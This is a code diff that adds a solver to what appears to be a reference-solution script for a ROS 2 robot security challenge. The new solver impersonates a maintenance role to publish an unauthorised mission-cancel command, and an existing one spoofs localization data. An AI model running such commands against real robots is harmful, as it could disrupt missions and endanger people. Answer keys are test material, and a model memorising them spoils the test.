@@ -21,6 +21,18 @@ def solve_task01(s: Session):
     s.submit(m.group(0) if m else "")
 
 
+def solve_task02(s: Session):
+    s.run_command("ros2 topic list")
+    # act as the maintenance role and issue a cancel the policy should not allow
+    s.run_command('ros2 topic pub -r 5 /mission/command std_msgs/msg/String '
+                  '"{data: \'{\\"role\\": \\"maintenance\\", \\"cmd\\": \\"cancel\\"}\'}" &')
+    deadline = time.monotonic() + 30
+    while time.monotonic() < deadline:
+        time.sleep(2)
+        if "mission_impact" in s.backend.confirm_checkpoints():
+            break
+
+
 def solve_task03(s: Session):
     s.run_command("ros2 topic list")
     s.run_command('ros2 topic pub -r 5 /loc_spoof geometry_msgs/msg/Vector3 "{x: 0.0, y: 2.0}" &')
@@ -33,7 +45,7 @@ def solve_task03(s: Session):
             break
 
 
-SOLVERS = {"task01": solve_task01, "task03": solve_task03}
+SOLVERS = {"task01": solve_task01, "task02": solve_task02, "task03": solve_task03}
 
 
 def run(task):
